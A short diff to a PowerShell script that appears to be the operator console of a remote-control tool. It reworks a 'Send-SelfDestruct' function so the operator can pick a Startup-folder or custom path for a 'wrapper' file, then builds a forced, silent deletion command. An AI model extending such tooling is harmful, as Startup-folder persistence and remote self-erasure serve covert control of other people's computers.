@@ -491,13 +491,30 @@ function Send-SelfDestruct {
 
     $removeWrapper = Read-Host "Destruct wrapper [y/n]"
     if ($removeWrapper -eq "" -or $removeWrapper -eq "y" -or $removeWrapper -eq "Y") {
-        $wrapperName = Read-Host "Path: STARTUP\"
-        if ($wrapperName) {
-            $wrapperPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\$wrapperName"
+        Write-Host "  1. Startup" -ForegroundColor White
+        Write-Host "  2. Custom" -ForegroundColor White
+        Write-Host ""
+
+        $wrapperPathChoice = Read-Host "Starting path"
+
+        switch ($wrapperPathChoice) {
+            "1" {
+                $wrapperFileName = Read-Host "STARTUP\"
+                $wrapperPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), $wrapperFileName)
+            }
+            "2" {
+                $wrapperPath = Read-Host "Path"
+            }
+            default {
+                Write-Host "Canceled`n" -ForegroundColor DarkRed
+                return
+            }
+        }
+        Write-Host ""
+        if ($wrapperPath) {
             $removeCommand = "Remove-Item '$wrapperPath' -Force -ErrorAction SilentlyContinue; "
         }
     }
-    Write-Host ""
 
     try {
         Write-Host "Getting access token..." -ForegroundColor White
@@ -1545,5 +1562,4 @@ while (-not $exitRequested) {
             Write-Host "Type 'help' for a list of available commands" -ForegroundColor DarkRed
         }
     }
-
 }
